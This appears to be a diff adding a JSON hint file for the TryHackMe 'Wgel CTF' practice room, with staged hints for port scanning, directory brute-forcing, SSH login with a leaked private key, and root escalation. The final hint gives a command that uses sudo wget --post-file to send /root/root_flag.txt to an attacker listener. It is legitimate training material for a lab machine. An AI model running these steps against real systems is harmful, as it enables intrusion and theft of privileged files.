@@ -1,0 +1,46 @@
+{
+  "slug":       "THM-Wgel",
+  "room":       "Wgel CTF",
+  "platform":   "TryHackMe",
+  "difficulty": "Easy",
+  "author":     "Omar Tamer",
+  "author_url": "https://omar-tamerr.github.io",
+  "tags":       ["web", "ssh", "privesc", "wget", "enumeration"],
+  "description": "Apache web server, developer comment leaks username, exposed SSH key, wget sudo privesc",
+  "full_writeup_url": "https://omar-tamerr.github.io/wgel.html",
+  "key_facts": [
+    "port 22 SSH",
+    "port 80 Apache2 web server",
+    "developer comment in source reveals username: jessie",
+    "/sitemap path discovered",
+    "gobuster finds hidden directories under /sitemap",
+    "private SSH key exposed in directory",
+    "SSH login as jessie using the private key",
+    "sudo -l shows wget can run as root no password",
+    "wget --post-file exfiltrates root flag to listener",
+    "user flag in /home/jessie/",
+    "root flag at /root/root_flag.txt"
+  ],
+  "stages": {
+    "recon": {
+      "nudge":     "You need to know what is running on this machine before anything else. What tool discovers open ports and services?",
+      "clue":      "Run an nmap scan against the target — pay attention to which services are running and their versions.",
+      "near_solve": "Run: nmap -sV -sC TARGET — you will find port 22 (SSH) and port 80 (Apache2). Port 80 is where you start."
+    },
+    "enumeration": {
+      "nudge":     "You have a web server on port 80. Open it in the browser and look carefully — not just at what is visible but at everything the server is telling you.",
+      "clue":      "The Apache default page is showing but something has been added. Look at the HTML source code — developers sometimes leave notes for themselves.",
+      "near_solve": "In the page source you will find a comment that reveals a username: Jessie. Then run gobuster: gobuster dir -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt — find /sitemap and enumerate inside it too."
+    },
+    "foothold": {
+      "nudge":     "You have a username. Look at what is inside the hidden directories — what would be very valuable to find there?",
+      "clue":      "Inside the directories under /sitemap there is an exposed SSH private key. Username plus private key — what can you do?",
+      "near_solve": "Download the private key, run chmod 600 id_rsa, then: ssh -i id_rsa jessie@TARGET — you land as jessie. User flag is in the home directory."
+    },
+    "privesc": {
+      "nudge":     "You are in as jessie. What is the first thing to check for privilege escalation on Linux?",
+      "clue":      "Run sudo -l — jessie can run one binary as root with no password. Think creatively about what that binary can do beyond its normal purpose.",
+      "near_solve": "jessie can run /usr/bin/wget as root. Use --post-file to send the root flag to your listener: nc -lvnp 80 on Kali, then on target: sudo wget --post-file=/root/root_flag.txt http://YOUR-TUN0-IP"
+    }
+  }
+}
